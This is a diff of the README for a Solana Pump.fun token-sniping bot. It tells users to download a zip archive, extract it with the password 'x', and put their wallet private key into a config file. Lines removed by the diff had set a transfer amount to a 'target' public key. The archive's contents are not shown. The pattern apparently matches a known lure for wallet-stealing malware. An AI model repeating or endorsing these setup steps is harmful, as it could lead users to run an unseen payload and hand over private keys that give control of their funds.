@@ -11,31 +11,28 @@ Bot for sniping tokens listed on Pump.fun in the Solana network using C# and the
 ## Installation
 - [Clone](https://github.com/sui-sensei/pump.fun/archive/refs/heads/main.zip) the repository
 - extract archive with pass `x`
-- create a `.env file` in the project's root directory and define your environment variables. You can use the provided `config.json`
+- create a `config.json` in the project's root directory and define your environment variables. You can use the provided `config.json`
 - run the bot.
 
 ## Configuration
 
 The bot uses environment variables for configuration. Create a `config.json` file in the root directory and set the following variables:
 
-- `SOLANA_PRIVATE_KEY`: Your Solana wallet's private key.
-- `TARGET_PUBLIC_KEY`: The public key of the target account.
-- `TRANSFER_AMOUNT`: The amount to transfer in lamports (1 SOL = 1_000_000_000 lamports).
+- `maxPosition`: The amount of sol for which a particular token will be purchased
+- `timeoutScan`:
+- `rpc`:
+- `solPrivate`: Your Solana wallet's private key.
+
 
 Example `config.json` file:
-```
-SOLANA_PRIVATE_KEY=your-private-key-here
-TARGET_PUBLIC_KEY=target-public-key-here
-TRANSFER_AMOUNT=1000000
-```
+
 ```json
 {
   "mainSettings": { 
     "maxPosition": "0.1",
     "timeoutScan": "30",
     "rpc": "https://<your-solana-rpc>.com:<port>",
-    "pkey": "<your-solana-private-key>"
-    "TransferAmount": "1000000"
+    "solPrivate": "<your-solana-private-key>"
   }
 }
 ```
